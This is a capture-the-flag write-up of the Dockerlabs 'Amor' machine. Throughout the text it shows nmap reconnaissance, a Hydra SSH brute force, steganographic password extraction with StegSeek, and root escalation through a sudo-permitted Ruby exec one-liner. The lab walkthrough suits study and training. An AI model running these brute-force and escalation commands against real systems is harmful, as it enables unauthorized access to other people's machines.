# Amor

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Amor | Romabri | Easy | dockerlabs |

**Summary:** The Amor machine presents a multifaceted attack surface that exploits human negligence and weak security practices within an organization. The attack begins with reconnaissance of a web server hosting a security-conscious company website, where an embedded message from management inadvertently discloses the name of a terminated employee: Juan. This initial information leak serves as the foundation for credential discovery. Through targeted SSH brute-force attacks leveraging the Hydra tool against a reasonable target username (Carlota), the attacker recovers valid credentials. Upon gaining initial access to the system, the attacker discovers that Carlota's home directory contains a subdirectory with vacation photographs. By exfiltrating an image file from the machine's local HTTP server, the attacker extracts hidden data using steganographic analysis. The embedded secret, extracted through StegSeek, contains a base64-encoded string that decodes to the password for another system user: Oscar. With Oscar's account compromised, the attacker discovers that this user possesses unrestricted sudo privileges for the Ruby interpreter, enabling a trivial privilege escalation to root through Ruby's exec functionality. The entire chain demonstrates how information disclosure, weak credential practices, steganography, and inadequate privilege separation can be chained together to achieve complete system compromise.

---

## Reconnaissance and Information Gathering

The first phase of the engagement involved deploying the vulnerable machine and conducting network reconnaissance to identify active services and potential entry points.

### Network Discovery

The machine was deployed using the automated deployment script and assigned the IP address 172.17.0.2. An Nmap scan was conducted to identify all open ports and services running on the target system.

```bash
nmap -sC -sV -p- -T4 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-14 14:44 WIB
Nmap scan report for 172.17.0.2
Host is up (0.0000090s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 7e:72:b6:8b:5f:7c:23:64:dc:15:21:32:5f:ce:40:0a (ECDSA)
|_  256 05:8a:a7:27:0f:88:b9:70:84:ec:6d:33:dc:ce:09:6f (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: SecurSEC S.L
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.01 seconds
```

The scan identified two primary services: SSH on port 22 and HTTP on port 80. Both services would be exploited at different stages of the engagement. OpenSSH version 9.6p1 and Apache httpd 2.4.58 are relatively current versions, suggesting the security posture focuses on application logic rather than patching.

### Web Application Analysis

The HTTP service was accessed using curl to retrieve the homepage and examine the application structure. The response revealed a Spanish-language website for "SecurSEC S.L," a company positioning itself as security-conscious.

```bash
curl -i http://172.17.0.2
HTTP/1.1 200 OK
Date: Sat, 14 Mar 2026 07:45:01 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Fri, 26 Apr 2024 10:32:34 GMT
ETag: "bd9-616fd6bf4b480"
Accept-Ranges: bytes
Content-Length: 3033
Vary: Accept-Encoding
Content-Type: text/html

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecurSEC S.L</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        header {
            background-color: #333;
            color: #fff;
            padding: 10px;
            text-align: center;
        }
        nav {
            background-color: #444;
            padding: 10px;
            text-align: center;
        }
        nav ul {
            list-style-type: none;
            margin: 0;
            padding: 0;
        }
        nav ul li {
            display: inline;
            margin-right: 10px;
        }
        section {
            padding: 20px;
        }
        .entry {
            border: 1px solid #ccc;
            padding: 10px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <header>
        <h1>SecurSEC S.L</h1>
    </header>
    <nav>
        <ul>
            <li><a href="#">Inicio</a></li>
            <li><a href="#">Servicios</a></li>
            <li><a href="#">Nosotros</a></li>
            <li><a href="#">Contacto</a></li>
        </ul>
    </nav>
    <section>
        <div class="entry">
            <h2>Ataque de phishing</h2>
            <p>Se detectó un intento de ataque de phishing dirigido a los empleados. Por favor, estén atentos y no proporcionen información confidencial por correo electrónico.</p>
        </div>
        <div class="entry">
            <h2>Actualización de software</h2>
            <p>Recordatorio: Asegúrese de mantener actualizados todos los programas y sistemas operativos en su dispositivo para protegerse contra vulnerabilidades de seguridad conocidas.</p>
        </div>
        <div class="entry">
            <h2>Contraseña débil detectada</h2>
            <p>Se ha identificado una contraseña débil en una cuenta de usuario. Por favor, cambie la contraseña por una más segura que incluya caracteres especiales y números.</p>
        </div>
        <div class="entry">
            <h2>¡Importante! Despido de empleado</h2>
            <p>Juan fue despedido de la empresa por enviar un correo con la contraseña a un compañero.</p>
            <p><strong>Firmado:</strong> Carlota, Departamento de ciberseguridad</p>
        </div>
        <div class="entry">
            <h2>Intento de acceso no autorizado</h2>
            <p>Se registraron múltiples intentos de acceso no autorizado a los servidores de la empresa desde una dirección IP desconocida. Se ha bloqueado el acceso y se está investigando el incidente.</p>
        </div>
        <div class="entry">
            <h2>Actualización de política de seguridad</h2>
            <p>Se ha actualizado la política de seguridad de la empresa. Por favor, revise los cambios y asegúrese de cumplir con las nuevas directrices para mantener un entorno seguro.</p>
        </div>
    </section>
</body>
</html>
```

The critical discovery from this reconnaissance phase was an announcement within the website that Carlota from the Cybersecurity Department had dismissed an employee named Juan for sending a password via email. This disclosure provided two valuable pieces of information: a confirmed employee name (Carlota) and indirect confirmation that the company manages privileged information carelessly. This inadvertent credential disclosure became the foundation for the subsequent brute-force attack.

---

## Initial Access: SSH Compromise

With Carlota identified as a valid system user from the web application, the next phase involved performing a targeted SSH brute-force attack to obtain valid credentials.

### SSH Credential Recovery

The Hydra tool was deployed against the SSH service using the rockyou.txt wordlist, a common password dictionary containing millions of entries. The attack targeted the username Carlota with reasonable parameters to avoid overwhelming the service.

```bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 8
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-14 15:05:28
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: carlota   password: babygirl
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-14 15:05:45
```

The brute-force attack succeeded in discovering Carlota's password: **babygirl**. This weak credential, likely violating the organization's own password policy recommendations visible on the website, enabled direct system access.

### Establishing SSH Session

Using the discovered credentials, a direct SSH connection was established to the target system.

```bash
ssh carlota@172.17.0.2
carlota@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.6.87.2-microsoft-standard-WSL2 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
$ id;whoami;hostname
uid=1001(carlota) gid=1001(carlota) groups=1001(carlota)
carlota
2e6482b16908
```

Access was confirmed. Carlota's user account operated with standard unprivileged permissions (UID 1001, GID 1001), indicating that further privilege escalation would be necessary to achieve root access. The system hostname displayed as "2e6482b16908," a Docker container identifier.

---

## Credential Exfiltration: Steganographic Extraction

With initial access secured, the next phase involved discovering additional credentials through examination of the user's accessible files. Carlota's home directory contained a Desktop folder with a subdirectory structure suggesting personal files.

### File Discovery and Exfiltration

A directory traversal within Carlota's home revealed a path to personal vacation photographs.

```bash
ls -la
total 32
drwxr-x--- 1 carlota carlota 4096 Mar 14 08:05 .
drwxr-xr-x 1 root    root    4096 Apr 26  2024 ..
-rw-r--r-- 1 carlota carlota  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 carlota carlota 3909 Apr 26  2024 .bashrc
drwx------ 2 carlota carlota 4096 Mar 14 08:05 .cache
-rw-r--r-- 1 carlota carlota  807 Mar 31  2024 .profile
drwxr-xr-x 1 root    root    4096 Apr 26  2024 Desktop
cd Desktop/fotos/vacaciones/
ls -la
total 60
drwxr-xr-x 1 root root  4096 Apr 26  2024 .
drwxr-xr-x 1 root root  4096 Apr 26  2024 ..
-rw-r--r-- 1 root root 51914 Apr 26  2024 imagen.jpg
```

The image file (imagen.jpg) required exfiltration to the attacker's machine. To facilitate this transfer, Carlota's system hosted a local HTTP server using Python's built-in http.server module on port 8080, allowing direct retrieval of the file from the attacker's system.

```bash
python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
172.17.0.1 - - [14/Mar/2026 08:09:36] "GET /imagen.jpg HTTP/1.1" 200 -
```

The image was downloaded to the attacking system using wget:

```bash
wget http://172.17.0.2:8080/imagen.jpg
--2026-03-14 15:09:36--  http://172.17.0.2:8080/imagen.jpg
Connecting to 172.17.0.2:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 51914 (51K) [image/jpeg]
Saving to: 'imagen.jpg'

imagen.jpg                        100%[============================================================>]  50.70K  --.-KB/s    in 0.001s

2026-03-14 15:09:36 (41.2 MB/s) - 'imagen.jpg' saved [51914 bytes]
```

### Steganographic Analysis

Once obtained locally, the image was analyzed using standard file forensics to determine its legitimacy as a JPEG file.

```bash
file imagen.jpg
imagen.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 626x626, components 3

exiftool imagen.jpg
ExifTool Version Number         : 13.36
File Name                       : imagen.jpg
Directory                       : .
File Size                       : 52 kB
File Modification Date/Time     : 2024:04:26 18:02:01+07:00
File Access Date/Time           : 2026:03:14 15:09:40+07:00
File Inode Change Date/Time     : 2026:03-14 15:09:36+07:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Image Width                     : 626
Image Height                    : 626
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                       : 626x626
Megapixels                      : 0.392
```

The file confirmed as a valid JPEG image. Standard metadata examination using exiftool revealed no immediately useful information. However, the presence of the image in a protected directory suggested it might contain embedded data. StegSeek, a specialized tool for detecting and extracting steganographically hidden content, was employed to analyze the image for concealed information.

```bash
stegseek imagen.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "secret.txt".
[i] Extracting to "imagen.jpg.out".
```

StegSeek successfully extracted hidden data from the image without requiring a password, indicating the steganographic embedding used no protective passphrase. The extracted content was stored in imagen.jpg.out.

### Secret Decryption

The extracted file contained base64-encoded data, a common encoding mechanism for obfuscating text while maintaining portability across text-based systems.

```bash
cat imagen.jpg.out
ZXNsYWNhc2FkZXBpbnlwb24=

cat imagen.jpg.out | base64 -d
eslacasadepinypon
```

The base64 string decoded to: **eslacasadepinypon** (translates to "Pinky and the Brain's house" in Spanish). This string represented the password for another system user: Oscar.

---

## Privilege Escalation: Lateral Movement and Ruby Exploitation

With Oscar's credentials obtained through steganographic extraction, the next phase involved switching to Oscar's account and identifying a path to root-level access.

### User Enumeration and Account Switching

System user enumeration was performed to identify all shell-enabled accounts on the machine.

```bash
cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
carlota:x:1001:1001::/home/carlota:/bin/sh
oscar:x:1002:1002::/home/oscar:/bin/sh
```

Four accounts possessed shell access: root, ubuntu, carlota, and oscar. The oscar account was the immediate target for lateral movement using the password recovered from the image.

```bash
su - oscar
Password: eslacasadepinypon
$ id;whoami
uid=1002(oscar) gid=1002(oscar) groups=1002(oscar)
oscar
$ /bin/bash
oscar@2e6482b16908:~$
```

Successfully authenticated as Oscar, the next step involved checking for sudo privileges that might enable escalation to root.

### Sudo Privilege Enumeration

Oscar's sudo configuration was queried to determine available privilege escalation paths.

```bash
sudo -l
Matching Defaults entries for oscar on 2e6482b16908:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User oscar may run the following commands on 2e6482b16908:
    (ALL) NOPASSWD: /usr/bin/ruby
```

The enumeration revealed a critical misconfiguration: Oscar possessed unrestricted sudo access to the Ruby interpreter with no password requirement. The "ALL" specification indicates Oscar could run Ruby as root without providing any authentication. This represents a severe privilege escalation vulnerability.

### Ruby-Based Root Access

Ruby, a flexible programming language, provides mechanisms to execute arbitrary system commands. By leveraging Ruby's exec function combined with sudo privileges, arbitrary commands can be executed as root. The exploit involved invoking Ruby with a one-liner that escalates to an interactive root shell.

```bash
sudo /usr/bin/ruby -e 'exec "sudo -i"'
root@2e6482b16908:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
2e6482b16908
root@2e6482b16908:~# ls -la
total 28
drwx------ 1 root root 4096 Mar 14 08:12 .
drwxr-xr-x 1 root root 4096 Mar 14 07:39 ..
-rw------- 1 root root    5 Mar 14 08:12 .bash_history
-rw-r--r-- 1 root root 3106 Apr 22  2024 .bashrc
-rw-r--r-- 1 root root  161 Apr 22  2024 .profile
drwx------ 2 root root 4096 Apr 26  2024 .ssh
drwxr-xr-x 2 root root 4096 Apr 26  2024 Desktop
root@2e6482b16908:~# pwd
/root
```

Root access was achieved. The final directory listing confirmed operation as the root user (UID 0, GID 0) with full access to the system's protected directories. The attack chain had reached its terminal objective: complete system compromise.

---

## Attack Chain Summary

1. **Reconnaissance**: Network scanning identified SSH and HTTP services running on the target. Web application analysis revealed unredacted employee names and internal security discussions, providing initial actionable intelligence for targeted attacks.

2. **Vulnerability Discovery**: The web application's information disclosure vulnerability disclosed the name "Carlota" as a valid system user and cybersecurity employee. This targeted intelligence enabled efficient brute-force credential recovery rather than arbitrary scanning of potential usernames.

3. **Exploitation**: SSH credentials for Carlota were recovered through dictionary-based password guessing using the Hydra brute-force tool. The weak password (babygirl) succumbed to standard attack methodologies within acceptable time constraints.

4. **Internal Enumeration**: Upon gaining access as Carlota, file system exploration revealed personal files containing steganographically embedded secrets. The StegSeek tool successfully extracted hidden passwords from image files without requiring prior knowledge of encoding passphrases.

5. **Privilege Escalation**: Lateral movement to Oscar's account was achieved using credentials obtained from steganographic extraction. Oscar's unrestricted sudo access to the Ruby interpreter provided a direct path to root-level command execution without password authentication, completing the compromise chain.

The complete attack demonstrates the cumulative risk of seemingly minor security oversights: information disclosure, weak credentials, insufficient file access controls, and excessive sudo privileges combine to enable complete system takeover from an unauthenticated external position.

---

